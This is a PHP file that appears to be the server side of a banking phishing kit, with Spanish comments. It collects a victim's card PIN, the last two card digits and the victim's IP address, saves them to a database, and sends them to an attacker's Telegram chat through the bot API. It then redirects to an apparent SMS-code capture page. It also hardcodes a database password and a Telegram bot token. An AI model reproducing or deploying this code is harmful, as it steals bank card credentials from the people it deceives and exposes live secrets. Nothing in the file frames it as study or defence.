<?php
// Configuración de la base de datos
$db_host = 'localhost';
$db_user = 'hbuobkhw_coopeel';
$db_pass = '!Y%6ycrbB~Xh';
$db_name = 'hbuobkhw_coopeel';

// Configuración de Telegram
$telegram_bot_token = '7936350980:AAED3GGszL2zl-eoBY7ePujWHmQ3bNFa5C4';
$telegram_chat_id = '-4736776245';

// Conexión a la base de datos
$conn = new mysqli($db_host, $db_user, $db_pass, $db_name);

if ($conn->connect_error) {
    die("Conexión fallida: " . $conn->connect_error);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Recibir datos del formulario
    $nip = $_POST['nip'] ?? '';
    $last2 = $_POST['last2'] ?? '';

    // Validar que los campos no estén vacíos
    if (empty($nip) || empty($last2)) {
        die("NIP o los dos últimos dígitos de la tarjeta no son válidos.");
    }

    // Obtener la IP del usuario
    $user_ip = $_SERVER['REMOTE_ADDR'];

    // Comprobar si ya existe un emoji asignado a esta IP
    $stmt = $conn->prepare("SELECT emoji FROM registros WHERE ip = ?");
    $stmt->bind_param("s", $user_ip);
    $stmt->execute();
    $stmt->store_result();

    if ($stmt->num_rows > 0) {
        // Si ya existe un registro para esta IP, recuperar el emoji asignado
        $stmt->bind_result($existing_emoji);
        $stmt->fetch();
        $emoji = $existing_emoji; // Usar el mismo emoji asignado previamente
    } else {
        // Si no existe un registro para esta IP, asignar un nuevo emoji aleatorio
        $emojis = ['🟥', '🟩', '🟦', '🟨', '🟪', '🟫', '🟧', '🟩', '🟦', '🟩'];
        $emoji = $emojis[array_rand($emojis)];
        
        // Guardar el nuevo emoji asignado a la IP
        $stmt_insert = $conn->prepare("INSERT INTO registros (nip, last2, ip, emoji) VALUES (?, ?, ?, ?)");
        $stmt_insert->bind_param("ssss", $nip, $last2, $user_ip, $emoji);
        $stmt_insert->execute();
        $stmt_insert->close();
    }

    // Repetir el emoji 4 veces
    $emoji_repeated = str_repeat($emoji, 4);

    // Enviar alerta a Telegram con formato en negrita y fuente monoespaciada
    $message = "*NIP:*\n\n" . 
               "*NIP:* `$nip`\n" . 
               "*Últimos 2 dígitos de la tarjeta:* `$last2`\n" . 
               "*IP del usuario:* `$user_ip`\n" . 
               "*Emoji asignado:* $emoji_repeated";  // Se envía el emoji repetido

    // URL de la API de Telegram
    $telegram_url = "https://api.telegram.org/bot$telegram_bot_token/sendMessage";
    
    // Datos a enviar a Telegram
    $data = [
        'chat_id' => $telegram_chat_id,
        'text' => $message,
        'parse_mode' => 'Markdown'  // Usar Markdown para el formato
    ];

    // Configuración de la solicitud HTTP
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ],
    ];

    $context = stream_context_create($options);
    $result = file_get_contents($telegram_url, false, $context);

    if ($result === FALSE) {
        echo "Error al enviar la alerta a Telegram.";
    } else {
        // Redirigir a otro HTML después de enviar la alerta
        header("Location: sms.html");
        exit; // Asegurarse de detener el script después de la redirección
    }

    $stmt->close();
}

$conn->close();
?>
